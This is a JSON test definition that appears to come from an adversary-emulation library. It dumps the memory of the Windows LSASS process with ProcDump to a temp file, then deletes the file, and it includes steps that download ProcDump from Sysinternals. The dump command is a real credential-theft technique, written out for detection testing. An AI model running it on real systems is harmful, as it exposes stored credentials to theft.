{
  "id": "7cede33f-0acd-44ef-9774-15511300b24b",
  "name": "Create Mini Dump of LSASS.exe using ProcDump",
  "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "8e5dc601-7b2e-4cb2-8724-44ea8d1dda30",
      "type": "execute-command",
      "data": {
        "command": "\"#{procdump_exe}\" -accepteula -mm lsass.exe #{output_file}\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "0e008f82-404e-48dd-a2c8-15f841b2a72d",
      "type": "execute-command",
      "data": {
        "command": "del \"#{output_file}\" \u003enul 2\u003e nul\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "b7dadcf8-24ad-4777-abe3-14bbfaddc8ed",
      "name": "Check dependency 1/1",
      "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "12373e07-6dd7-47ca-9a8e-628a7ffe370d",
      "name": "Resolve dependency 1/1",
      "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7eb62bb8-6af0-4d8d-a2f0-31d6f69afad3",
      "name": "Re-check dependency 1/1",
      "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "8e5dc601-7b2e-4cb2-8724-44ea8d1dda30",
      "p": "on-success",
      "o": "0e008f82-404e-48dd-a2c8-15f841b2a72d"
    },
    {
      "s": "8e5dc601-7b2e-4cb2-8724-44ea8d1dda30",
      "p": "on-failure",
      "o": "0e008f82-404e-48dd-a2c8-15f841b2a72d"
    },
    {
      "s": "b7dadcf8-24ad-4777-abe3-14bbfaddc8ed",
      "p": "on-success",
      "o": "8e5dc601-7b2e-4cb2-8724-44ea8d1dda30"
    },
    {
      "s": "b7dadcf8-24ad-4777-abe3-14bbfaddc8ed",
      "p": "on-failure",
      "o": "12373e07-6dd7-47ca-9a8e-628a7ffe370d"
    },
    {
      "s": "12373e07-6dd7-47ca-9a8e-628a7ffe370d",
      "p": "on-success",
      "o": "7eb62bb8-6af0-4d8d-a2f0-31d6f69afad3"
    },
    {
      "s": "7eb62bb8-6af0-4d8d-a2f0-31d6f69afad3",
      "p": "on-failure",
      "o": "8e5dc601-7b2e-4cb2-8724-44ea8d1dda30"
    }
  ],
  "tags": [
    "T1003.001",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "procdump_exe",
      "type": "path",
      "description": "Path of Procdump executable",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe"
    },
    {
      "name": "output_file",
      "type": "path",
      "description": "Path where resulting dump should be placed",
      "value": "C:\\Windows\\Temp\\lsass_dump.dmp"
    }
  ]
}